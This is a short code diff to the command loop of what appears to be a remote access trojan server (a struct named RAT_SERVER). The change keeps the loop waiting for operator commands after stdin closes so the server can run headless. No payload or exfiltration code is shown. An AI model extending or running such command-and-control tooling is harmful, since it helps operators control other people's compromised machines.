@@ -605,11 +605,26 @@ void execute_commands(RAT_SERVER *server) {
         // Client prompt is already displayed by receive_response above
         if (!fgets(command, sizeof(command), stdin)) {
             if (feof(stdin)) {
-                printf("\nEnd of input. Exiting...\n");
+                printf("\n[*] stdin closed (headless mode). Server staying alive.\n");
+                while (1) {
+                    if (server->client_fd == INVALID_SOCKET) {
+                        printf("Connection lost. Exiting command loop.\n");
+                        return;
+                    }
+                    sleep(1);
+                    clearerr(stdin);
+                    if (fgets(command, sizeof(command), stdin)) {
+                        break;
+                    }
+                    if (!feof(stdin)) {
+                        perror("Error reading command input");
+                        return;
+                    }
+                }
             } else {
                 perror("Error reading command input");
+                break;
             }
-            break;
         }
         
         // Remove newline
@@ -753,8 +768,9 @@ int main() {
         return 1;
     }
     
+    printf("[*] Connection established. Waiting for commands...\n");
     execute_commands(&server);
-    
+
     cleanup(&server);
     return 0;
 }
